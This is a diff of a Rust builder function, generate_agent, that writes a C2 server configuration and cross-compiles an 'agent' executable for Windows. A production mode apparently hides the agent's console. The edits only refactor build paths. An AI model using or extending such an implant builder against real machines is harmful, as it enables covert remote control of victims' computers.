@@ -12,22 +12,22 @@ pub fn generate_agent(
 ) -> Result<(), Box<dyn std::error::Error>> {
     println!("🔧 Generando configuración del agente...");
 
-    // Detectar si estamos en target/release/
-    let agent_path = if std::env::current_dir()?
+    // Determine workspace root and agent path
+    let (workspace_root, agent_relative_path) = if std::env::current_dir()?
         .to_string_lossy()
         .contains("target/release")
     {
-        "../../agent"
+        ("../../".to_string(), "../../agent".to_string())
     } else {
-        "agent"
+        (".".to_string(), "agent".to_string())
     };
 
     // Crear directorios si no existen
-    let config_dir = format!("{}/src", agent_path);
+    let config_dir = format!("{}/src", agent_relative_path);
     std::fs::create_dir_all(&config_dir)?;
 
     // Generar config.rs (solo servidor C2, sin shellcode ni encriptación)
-    let config_file_path = format!("{}/src/config.rs", agent_path);
+    let config_file_path = format!("{}/src/config.rs", agent_relative_path);
     let mut config_file = File::create(&config_file_path)?;
 
     writeln!(
@@ -46,7 +46,7 @@ pub fn generate_agent(
     // Compilar el agente con features apropiadas
     println!("🔨 Compilando agente para Windows...");
     
-    let mut cargo_args = vec!["build", "--release", "--target", "x86_64-pc-windows-gnu"];
+    let mut cargo_args = vec!["build", "--release", "--target", "x86_64-pc-windows-gnu", "-p", "agent"];
     
     // Agregar flags de feature según el modo
     if production {
@@ -56,20 +56,19 @@ pub fn generate_agent(
         cargo_args.push("production");
     } else {
         println!("🐛 Modo DESARROLLO: con consola y debug prints");
-        cargo_args.push("--features");
-        cargo_args.push("dev");
+        // dev is default, no need to specify
     }
     
     let output = Command::new("cargo")
         .args(&cargo_args)
-        .current_dir(agent_path)
+        .current_dir(&workspace_root)
         .output()?;
 
     if output.status.success() {
         println!("✅ Compilación exitosa!");
         let exe_path = format!(
             "{}/target/x86_64-pc-windows-gnu/release/agent.exe",
-            agent_path
+            workspace_root
         );
         println!("🏃 Ejecutable generado en {}", exe_path);
 
